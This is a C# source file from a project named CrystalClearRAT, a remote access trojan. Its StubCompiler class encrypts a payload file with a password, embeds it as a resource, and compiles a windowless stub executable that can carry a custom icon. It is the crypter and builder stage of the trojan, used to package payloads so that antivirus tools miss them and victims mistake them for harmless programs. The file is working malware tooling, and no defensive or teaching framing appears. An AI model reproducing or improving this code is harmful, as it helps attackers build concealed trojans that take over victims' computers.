using CrystalClearRAT.Helper;
using CrystalRATShared.Helper;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace CrystalClearRAT.Stub
{
    public static class StubCompiler
    {


        public static string EncryptPayload(string payloadPath, string password)
        {
            string bytes = Convert.ToBase64String(File.ReadAllBytes(payloadPath));
            return StringCipher.Encrypt(bytes, password);
        }
        public static void Compile(string payload, string outputPath, string iconPath = null)
        {

            var assembly = Assembly.GetExecutingAssembly();

            List<string> resourceNames = new List<string>();
            List<string> codeFiles = new List<string>();

            resourceNames.Add("Entry.cs");
            resourceNames.Add("StringCipher.cs");

            for (int i = 0; i < resourceNames.Count; i++)
            {
                string resourceName = assembly.GetManifestResourceNames().Single(str => str.EndsWith(resourceNames[i]));
                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                using (StreamReader reader = new StreamReader(stream))
                {
                    codeFiles.Add(reader.ReadToEnd());
                }
            }





            var csc = new CSharpCodeProvider(new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });
            var parameters = new CompilerParameters(new[] {
                "mscorlib.dll",
                "System.dll",
                "System.Core.dll",
                "System.Security.dll",
            }, outputPath, true);
            parameters.CompilerOptions = $@"/target:winexe";

            if (iconPath != null)
            {
                parameters.CompilerOptions += $" /win32icon:{ iconPath}";
            }

            File.WriteAllText("payload.txt", payload);
            parameters.EmbeddedResources.Add("payload.txt");
            parameters.GenerateExecutable = true;
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, codeFiles.ToArray());
            results.Errors.Cast<CompilerError>().ToList().ForEach(error => Console.WriteLine(error.ErrorText));
            File.Delete("payload.txt");
        }

    }
}
